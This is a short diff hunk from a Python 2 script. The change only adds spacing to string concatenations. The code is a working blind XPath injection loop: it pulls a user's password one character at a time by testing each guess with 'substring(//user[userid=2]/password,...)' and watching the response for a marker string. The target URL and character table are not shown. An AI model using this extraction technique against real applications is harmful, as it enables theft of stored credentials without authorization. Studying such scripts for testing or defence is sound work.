@@ -47,11 +47,11 @@ chars = {
 password = ''
 for i in range(1,14):
   for char in chars.keys():
-    r = urllib2.urlopen(url+"2 and substring(//user[userid=2]/password," + str(i) + ", 1) = " + chars[str(char)])
+    r = urllib2.urlopen(url + "2 and substring(//user[userid=2]/password," + str(i) + ", 1) = " + chars[str(char)])
     data = r.read()
 
     if data.find("John")!= -1:
-      print "["+str(i)+"] -> " + char
+      print "[" + str(i) + "] -> " + char
       password = password + char
       break
 
